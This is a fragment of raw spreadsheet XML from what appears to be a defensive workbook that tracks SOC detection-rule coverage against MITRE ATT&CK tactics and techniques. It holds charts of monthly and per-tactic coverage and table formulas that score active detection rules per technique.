                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$5</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.5933308896706464</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000008-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="4"/>
          <c:order val="4"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$6</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>July</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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$6</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.63333088967064599</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{0000000A-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="5"/>
          <c:order val="5"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$7</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>August</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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$7</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.64309582263718856</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{0000000C-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="6"/>
          <c:order val="6"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$8</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>September</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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$8</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.64383987025623612</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{0000000E-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="7"/>
          <c:order val="7"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$9</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>October</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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$9</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.65</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000010-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="8"/>
          <c:order val="8"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$10</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>November</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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$10</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>0.65499437305318087</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000012-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="9"/>
          <c:order val="9"/>
          <c:tx>
            <c:strRef>
              <c:f>'Basic Progress'!$A$11</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>December</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 Progress'!$P$1</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Coverage</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Basic Progress'!$P$11</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>1.7081586422447767E-2</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000014-20C6-490A-AAC6-8141AF4B90BE}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:dLbls>
          <c:showLegendKey val="0"/>
          <c:showVal val="0"/>
          <c:showCatName val="0"/>
          <c:showSerName val="0"/>
          <c:showPercent val="0"/>
          <c:showBubbleSize val="0"/>
        </c:dLbls>
        <c:gapWidth val="219"/>
        <c:axId val="915203592"/>
        <c:axId val="915205640"/>
      </c:barChart>
      <c:catAx>
        <c:axId val="915203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205640"/>
        <c:crosses val="autoZero"/>
        <c:auto val="1"/>
        <c:lblAlgn val="ctr"/>
        <c:lblOffset val="100"/>
        <c:noMultiLvlLbl val="0"/>
      </c:catAx>
      <c:valAx>
        <c:axId val="915205640"/>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 Covered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203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MITRE ATT&amp;CK Framework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strRef>
              <c:f>'Advanced Progress'!$A$4</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Current Controls</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:ln w="28575" cap="rnd">
              <a:solidFill>
                <a:srgbClr val="FABF8F"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
              <a:round/>
            </a:ln>
            <a:effectLst/>
          </c:spPr>
          <c:marker>
            <c:symbol val="circle"/>
            <c:size val="5"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="FABF8F"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="FABF8F"/>
                </a:solidFill>
                <a:prstDash val="solid"/>
              </a:ln>
              <a:effectLst/>
            </c:spPr>
          </c:marker>
          <c:cat>
            <c:strRef>
              <c:f>'Advanced Progress'!$B$1:$O$1</c:f>
              <c:strCache>
                <c:ptCount val="14"/>
                <c:pt idx="0">
                  <c:v>Reconnaissance</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>Resource Development</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>Initial Access</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>Execution</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>Persistence</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>Privilege Escalation</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>Defense Evasion</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>Credential Access</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>Discovery</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>Lateral Movement</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>Collection</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>Command and Control</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>Exfiltration</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>Impact</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Advanced Progress'!$B$4:$O$4</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="14"/>
                <c:pt idx="0">
                  <c:v>3.3333333333333333E-2</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>6.4935064935064939E-3</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>0</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>0</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>2.6623376623376625E-2</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>1.4705882352941176E-2</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>4.6875E-2</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>0</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>0</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>0</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>0.1111111111111111</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>0</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000004-CD00-4C2E-822D-D38AEE873645}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="1"/>
          <c:order val="1"/>
          <c:tx>
            <c:strRef>
              <c:f>'Advanced Progress'!$A$2</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Minimum Baseline</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:ln w="28575" cap="rnd">
              <a:solidFill>
                <a:srgbClr val="92CDDC"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
              <a:round/>
            </a:ln>
            <a:effectLst/>
          </c:spPr>
          <c:marker>
            <c:symbol val="circle"/>
            <c:size val="5"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="92CDDC"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="92CDDC"/>
                </a:solidFill>
                <a:prstDash val="solid"/>
              </a:ln>
              <a:effectLst/>
            </c:spPr>
          </c:marker>
          <c:cat>
            <c:strRef>
              <c:f>'Advanced Progress'!$B$1:$O$1</c:f>
              <c:strCache>
                <c:ptCount val="14"/>
                <c:pt idx="0">
                  <c:v>Reconnaissance</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>Resource Development</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>Initial Access</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>Execution</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>Persistence</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>Privilege Escalation</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>Defense Evasion</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>Credential Access</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>Discovery</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>Lateral Movement</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>Collection</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>Command and Control</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>Exfiltration</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>Impact</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Advanced Progress'!$B$2:$O$2</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="14"/>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numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000006-CD00-4C2E-822D-D38AEE873645}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:ser>
          <c:idx val="2"/>
          <c:order val="2"/>
          <c:tx>
            <c:strRef>
              <c:f>'Advanced Progress'!$A$3</c:f>
              <c:strCache>
                <c:ptCount val="1"/>
                <c:pt idx="0">
                  <c:v>Desired State</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:tx>
          <c:spPr>
            <a:ln w="28575" cap="rnd">
              <a:solidFill>
                <a:srgbClr val="92D050"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
              <a:round/>
            </a:ln>
            <a:effectLst/>
          </c:spPr>
          <c:marker>
            <c:symbol val="circle"/>
            <c:size val="5"/>
            <c:spPr>
              <a:solidFill>
                <a:srgbClr val="92D050"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:prstDash val="solid"/>
              </a:ln>
              <a:effectLst/>
            </c:spPr>
          </c:marker>
          <c:cat>
            <c:strRef>
              <c:f>'Advanced Progress'!$B$1:$O$1</c:f>
              <c:strCache>
                <c:ptCount val="14"/>
                <c:pt idx="0">
                  <c:v>Reconnaissance</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>Resource Development</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>Initial Access</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>Execution</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>Persistence</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>Privilege Escalation</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>Defense Evasion</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>Credential Access</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>Discovery</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>Lateral Movement</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>Collection</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>Command and Control</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>Exfiltration</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>Impact</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Advanced Progress'!$B$3:$O$3</c:f>
              <c:numCache>
                <c:formatCode>0%</c:formatCode>
                <c:ptCount val="1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numCache>
            </c:numRef>
          </c:val>
          <c:extLst>
            <c:ext xmlns:c16="http://schemas.microsoft.com/office/drawing/2014/chart" uri="{C3380CC4-5D6E-409C-BE32-E72D297353CC}">
              <c16:uniqueId val="{00000008-CD00-4C2E-822D-D38AEE873645}"/>
            </c:ext>
          </c:extLst>
        </c:ser>
        <c:dLbls>
          <c:showLegendKey val="0"/>
          <c:showVal val="0"/>
          <c:showCatName val="0"/>
          <c:showSerName val="0"/>
          <c:showPercent val="0"/>
          <c:showBubbleSize val="0"/>
        </c:dLbls>
        <c:axId val="579663367"/>
        <c:axId val="579665415"/>
      </c:radarChart>
      <c:catAx>
        <c:axId val="579663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665415"/>
        <c:crosses val="autoZero"/>
        <c:auto val="1"/>
        <c:lblAlgn val="ctr"/>
        <c:lblOffset val="100"/>
        <c:noMultiLvlLbl val="0"/>
      </c:catAx>
      <c:valAx>
        <c:axId val="5796654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6633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666750</xdr:colOff>
      <xdr:row>11</xdr:row>
      <xdr:rowOff>0</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>9</xdr:col>
      <xdr:colOff>619125</xdr:colOff>
      <xdr:row>24</xdr:row>
      <xdr:rowOff>171450</xdr:rowOff>
    </xdr:to>
    <xdr:graphicFrame macro="">
      <xdr:nvGraphicFramePr>
        <xdr:cNvPr id="45" name="Chart 3">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B25AC5F5-1637-697A-66EF-36CDFAAC2EAA}"/>
            </a:ext>
            <a:ext uri="{147F2762-F138-4A5C-976F-8EAC2B608ADB}">
              <a16:predDERef xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" pred="{7659EAC4-F940-A12D-B1DE-7FB986189D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28575</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>11</xdr:col>
      <xdr:colOff>238125</xdr:colOff>
      <xdr:row>31</xdr:row>
      <xdr:rowOff>95250</xdr:rowOff>
    </xdr:to>
    <xdr:graphicFrame macro="">
      <xdr:nvGraphicFramePr>
        <xdr:cNvPr id="6" name="Chart 5">
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18A0E870-7939-48F4-728B-7A240D8429F9}"/>
            </a:ext>
            <a:ext uri="{147F2762-F138-4A5C-976F-8EAC2B608ADB}">
              <a16:predDERef xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" pred="{EE1B1741-FF03-145B-071B-FA9DA809CF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CF494C-71D7-4F01-A6FE-0C626D41D52C}" name="Detections" displayName="Detections" ref="A1:N644" totalsRowShown="0" headerRowDxfId="179">
  <autoFilter ref="A1:N644" xr:uid="{48CF494C-71D7-4F01-A6FE-0C626D41D52C}"/>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="B2:H377">
    <sortCondition ref="B1:B377"/>
  </sortState>
  <tableColumns count="14">
    <tableColumn id="3" xr3:uid="{AA6FFBB7-CF91-44EA-B7B1-BAC9BEF32B83}" name="Source" dataDxfId="178"/>
    <tableColumn id="2" xr3:uid="{10C75E0C-B704-4EA5-AA70-A2BE0DB7C02B}" name="Use Case" dataDxfId="177"/>
    <tableColumn id="4" xr3:uid="{38285B2C-2342-4725-81FF-3E0C19E8C87F}" name="Rule Description" dataDxfId="176"/>
    <tableColumn id="5" xr3:uid="{311BD97C-6A80-4D6B-BEC4-5097EA9187B7}" name="Is Active"/>
    <tableColumn id="6" xr3:uid="{9387841B-24F4-440C-9B3A-FB998B2A41EB}" name="Attack1" dataDxfId="175"/>
    <tableColumn id="7" xr3:uid="{167DE3E3-49B8-43C3-BD89-277BC435BEF6}" name="Attack2" dataDxfId="174"/>
    <tableColumn id="8" xr3:uid="{6B1FCDEF-60E9-41C0-85B5-A179164F105C}" name="Attack3" dataDxfId="173"/>
    <tableColumn id="9" xr3:uid="{F75E0202-7E82-476D-88DE-630B7710E355}" name="Attack4" dataDxfId="172"/>
    <tableColumn id="10" xr3:uid="{022D88A7-4629-49D4-ADEC-F3C21254519D}" name="Attack5" dataDxfId="171"/>
    <tableColumn id="11" xr3:uid="{6F26179C-FF7E-438B-B8E9-885EADAF35AA}" name="Attack6" dataDxfId="170"/>
    <tableColumn id="12" xr3:uid="{7453AA1E-CCB4-483A-941D-15AF57D114B1}" name="Attack7" dataDxfId="169"/>
    <tableColumn id="13" xr3:uid="{840E6FCE-0B5E-481C-95FA-B715C5128B83}" name="Attack8" dataDxfId="168"/>
    <tableColumn id="14" xr3:uid="{3ADC7A22-4495-4093-B1A2-B269B56225B6}" name="Attack9" dataDxfId="167"/>
    <tableColumn id="15" xr3:uid="{9AEFEC10-2018-4BBA-9CE3-9440F81EEF5A}" name="Attack10" dataDxfId="16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0066140-984F-4B3E-AA68-2ED499BF2368}" name="Techniques" displayName="Techniques" ref="A1:X657" totalsRowShown="0" headerRowDxfId="165" dataDxfId="163" headerRowBorderDxfId="164" tableBorderDxfId="162">
  <autoFilter ref="A1:X657" xr:uid="{10066140-984F-4B3E-AA68-2ED499BF2368}"/>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:X626">
    <sortCondition ref="B1:B626"/>
  </sortState>
  <tableColumns count="24">
    <tableColumn id="1" xr3:uid="{3A5ED5C2-6C11-42AC-A964-65059E70A868}" name="Technique" dataDxfId="161"/>
    <tableColumn id="27" xr3:uid="{694BD5B2-6318-4719-9524-F68AB4CF802C}" name="ID" dataDxfId="160"/>
    <tableColumn id="2" xr3:uid="{3B3FA0B4-B272-4F17-BED8-3F89DE619934}" name="Name" dataDxfId="159"/>
    <tableColumn id="3" xr3:uid="{3FD4014F-70DB-4425-AB99-8374AF89BC6D}" name="Tactics" dataDxfId="158"/>
    <tableColumn id="4" xr3:uid="{B2C2832E-1797-4998-A721-133FF19DB88F}" name="Data Sources" dataDxfId="157"/>
    <tableColumn id="5" xr3:uid="{A1C01DD3-37AB-4CA0-9F56-E76B3C22E71A}" name="Data Sources No." dataDxfId="156">
      <calculatedColumnFormula>LEN(E2)-LEN(SUBSTITUTE(E2,",",""))+1</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="6" xr3:uid="{64C1E4EA-FA2A-4C51-9703-241659258829}" name="Data Sources Available" dataDxfId="155">
      <calculatedColumnFormula array="1">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="26" xr3:uid="{419AAA71-053B-48AA-93E0-4C89637F50EE}" name="No. of Sub Techniques" dataDxfId="154">
      <calculatedColumnFormula array="1">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="28" xr3:uid="{E4F76BCE-417E-4DD3-9B38-997CD76796CE}" name="Detection Rules for Technique" dataDxfId="153">
      <calculatedColumnFormula array="1">IF(SUM(IF($C2=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C2=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="29" xr3:uid="{1A100415-9209-46B9-8301-8EB69611911D}" name="Detection Rules for SubTech" dataDxfId="152">
      <calculatedColumnFormula array="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calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="30" xr3:uid="{E5312A8C-B40C-470A-8FB6-F7461CAAB4D9}" name="Min. Detection Rules" dataDxfId="151">
      <calculatedColumnFormula>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="31" xr3:uid="{A80AD32B-3913-4DB2-BD97-2091577E0689}" name="Detection Rules Modifier" dataDxfId="150"/>
    <tableColumn id="32" xr3:uid="{8A6BBB2F-6950-407E-B6A9-7AFD9630A1F6}" name="Expected Detection Rules" dataDxfId="149">
      <calculatedColumnFormula array="1">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="33" xr3:uid="{C16C3E49-3EAB-46AB-A800-E613BF3C2599}" name="Detection Rules" dataDxfId="148">
      <calculatedColumnFormula>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="34" xr3:uid="{BAD60275-13EE-4E09-B5E9-657CE5CC396F}" name="Coverage" dataDxfId="147">
      <calculatedColumnFormula>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="35" xr3:uid="{639FE5EB-551B-47C1-8900-259930EC7FA9}" name="Technique Status" dataDxfId="146">
      <calculatedColumnFormula>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="36" xr3:uid="{902A4690-3282-4006-9174-5E3143D630BC}" name="Notes" dataDxfId="145"/>
    <tableColumn id="39" xr3:uid="{80C2E554-D26E-4E38-AA68-D1EB98F8D11F}" name="ID Checks" dataDxfId="144"/>
    <tableColumn id="40" xr3:uid="{5E6F0AF2-4E0C-41A2-A92B-119CC81CEDF0}" name="Error Checks" dataDxfId="143">
      <calculatedColumnFormula>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calculatedColumnFormula>
    </tableColumn>
    <tableColumn id="15" xr3:uid="{F744E0A6-BE64-4F86-91C7-FDBBCD5F88BB}" name="platforms" dataDxfId="142"/>
    <tableColumn id="8" xr3:uid="{F86C1390-B39C-40E9-988B-80C831C176C6}" name="description" dataDxfId="141"/>
    <tableColumn id="14" xr3:uid="{F0D33E15-7D13-46BC-8063-AA3BC9B6F706}" name="detection" dataDxfId="140"/>
    <tableColumn id="16" xr3:uid="{9DD62262-DC3B-4D99-B888-76A0AAF73669}" name="is sub-technique" dataDxfId="139"/>
    <tableColumn id="17" xr3:uid="{2FC36932-F537-4517-9469-FB898557A4FC}" name="sub-technique of" dataDxfId="138"/>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C39649C-6FDC-462B-B66F-C3CAFC155A9E}" name="Sources" displayName="Sources" ref="A1:H146" totalsRowShown="0" headerRowDxfId="137" headerRowBorderDxfId="136" tableBorderDxfId="135">
  <autoFilter ref="A1:H146" xr:uid="{1C39649C-6FDC-462B-B66F-C3CAFC155A9E}"/>
  <tableColumns count="8">
    <tableColumn id="1" xr3:uid="{42A1F5B4-0F8E-48A2-B645-E3346F997457}" name="Data Source"/>
    <tableColumn id="2" xr3:uid="{09B530F2-5B66-4DE2-A310-66A409EDBC75}" name="ID"/>
    <tableColumn id="3" xr3:uid="{F865FC8D-DFC5-4ABE-9A38-7F7AE11B1ECB}" name="Available" dataDxfId="134"/>
    <tableColumn id="4" xr3:uid="{2AD1446D-4B88-4A06-B5C1-DE9928F270C4}" name="Note" dataDxfId="133"/>
    <tableColumn id="6" xr3:uid="{DEC6DB1F-CFA7-41FA-B493-F9E40CFCD98C}" name="collection layers"/>
    <tableColumn id="7" xr3:uid="{C55ECA40-DFFB-4DC8-A4D2-1B0CB3DED768}" name="platforms"/>
    <tableColumn id="11" xr3:uid="{1B3A4C1E-945B-455B-9E92-11E44A3417D0}" name="type"/>
    <tableColumn id="5" xr3:uid="{153C96F1-F314-4037-B58D-FC5C6FAE2A9B}" name="description"/>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D533E-C19A-45EF-801B-8E4DDA5C2177}">
  <dimension ref="A1:AB45"/>
  <sheetViews>
    <sheetView tabSelected="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.88671875" defaultRowHeight="27" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="20.6640625" style="4" customWidth="1"/>
    <col min="2" max="2" width="5.109375" style="5" customWidth="1"/>
    <col min="3" max="3" width="20.6640625" style="4" customWidth="1"/>
    <col min="4" max="4" width="5.109375" style="5" customWidth="1"/>
    <col min="5" max="5" width="20.6640625" style="4" customWidth="1"/>
    <col min="6" max="6" width="5.109375" style="5" customWidth="1"/>
    <col min="7" max="7" width="20.6640625" style="4" customWidth="1"/>
    <col min="8" max="8" width="5.109375" style="5" customWidth="1"/>
